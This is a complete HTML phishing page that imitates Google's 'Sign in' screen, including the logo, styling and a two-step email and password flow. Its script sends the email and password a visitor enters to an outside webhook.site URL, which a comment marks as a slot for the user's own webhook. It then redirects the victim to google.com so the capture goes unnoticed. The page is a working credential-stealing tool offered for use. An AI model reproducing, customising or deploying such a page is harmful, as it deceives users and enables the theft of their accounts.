<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in - Google accounts</title>
    <style>
        body {
            font-family: arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #f2f2f2;
        }
        .container {
            width: 450px;
            padding: 40px 60px 30px;
            border: 1px solid #ebebeb;
            border-radius: 8px;
            background-color: white;
            text-align: center;
        }
        h1 {
            margin-bottom: 10px;
            font-size: 24px;
            font-weight: normal;
        }
        input[type="email"], input[type="password"] {
            width: 100%;
            padding: 13px 15px;
            margin: 10px 0;
            box-sizing: border-box;
            border: 1px solid #dadce0;
            border-radius: 4px;
            font-size: 16px;
        }
        input:focus {
            border-color: #1a73e8;
            outline: none;
        }
        button {
            background-color: #1a73e8;
            color: white;
            border: none;
            padding: 10px 24px;
            border-radius: 4px;
            font-size: 14px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 20px;
        }
        button:hover {
            background-color: #1765cc;
        }
        .error {
            color: #d93025;
            font-size: 14px;
            margin-top: 10px;
            display: none;
        }
    </style>
</head>
<body>

<div class="container">
    <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google Logo" style="margin-bottom: 20px;">
    <h1>Sign in</h1>
    <p>Use your Google Account</p>
    
    <form id="loginForm">
        <input type="email" id="email" placeholder="Email or phone" required>
        <div id="emailStep">
            <button type="button" onclick="nextStep()">Next</button>
        </div>
        <div id="passwordStep" style="display: none;">
            <input type="password" id="password" placeholder="Enter your password" required>
            <button type="button" onclick="submitForm()">Next</button>
        </div>
        <div class="error" id="errorMsg">Enter a valid email address</div>
    </form>
</div>

<script>
    // YOUR WEBHOOK URL HERE
    const webhookUrl = "https://webhook.site/9f7463ee-3637-48df-bfef-e22245193603";

    function nextStep() {
        const email = document.getElementById('email').value;
        if (email.includes('@') || email.includes('.')) {
            document.getElementById('emailStep').style.display = 'none';
            document.getElementById('passwordStep').style.display = 'block';
            document.getElementById('password').focus();
        } else {
            document.getElementById('errorMsg').style.display = 'block';
        }
    }

    async function submitForm() {
        const email = document.getElementById('email').value;
        const password = document.getElementById('password').value;
        
        // Send data to Webhook using Fetch
        try {
            await fetch(webhookUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    email: email,
                    password: password
                })
            });
            
            // Redirect to Google after successful capture
            window.location.href = "https://www.google.com";
        } catch (error) {
            console.error('Error:', error);
            alert("Something went wrong. Please try again.");
        }
    }
</script>

</body>
</html>
